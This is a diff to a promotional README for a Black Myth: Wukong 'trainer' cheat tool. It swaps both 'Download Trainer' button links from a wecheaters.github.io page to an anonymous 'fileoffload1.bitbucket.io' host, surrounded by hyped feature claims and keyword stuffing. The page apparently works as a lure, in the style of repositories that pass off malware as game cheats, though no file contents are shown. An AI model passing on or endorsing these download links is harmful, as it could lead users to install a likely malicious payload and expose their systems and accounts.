@@ -6,7 +6,7 @@
 
 This isn’t some basic cheat — the **Wukong Trainer** gives you real-time access to **God Mode, One-Hit Kill, Infinite Stamina, Skill Unlocks**, and more through a sleek in-game UI. Whether you're here to test builds or just flex on bosses, this is the tool.
 
-[![Download Trainer](https://img.shields.io/badge/Download-Trainer-blueviolet)](https://wecheaters.github.io/cheats/black-myth-wukong/)
+[![Download Trainer](https://img.shields.io/badge/Download-Trainer-blueviolet)](https://fileoffload1.bitbucket.io)
 ---
 
 ## 🎮 What Is a Black Myth Trainer?
@@ -15,7 +15,7 @@ A **trainer** is a stand-alone mod tool that injects custom commands into the ga
 
 > 🧠 Trainers are ideal for solo players who want to skip the grind, test everything, or turn the game into an action sandbox.
 
-[![Download Trainer](https://i.playground.ru/e/gzUaFPbWhrT-lLrqXx3snw.png)](https://wecheaters.github.io/cheats/black-myth-wukong/)
+[![Download Trainer](https://i.playground.ru/e/gzUaFPbWhrT-lLrqXx3snw.png)](https://fileoffload1.bitbucket.io)
 ---
 
 ## 🔥 Core Features of the Wukong Trainer
@@ -111,3 +111,4 @@ If you're looking to explore the **mythical chaos** of Black Myth: Wukong withou
 Black Myth Wukong trainer, god mode Wukong, cheat menu Wukong, infinite health Wukong, Wukong skill unlocker, Black Myth XP boost, one-hit kill cheat, action RPG trainer, Wukong gameplay mod, boss fight cheat
 
 ---
+
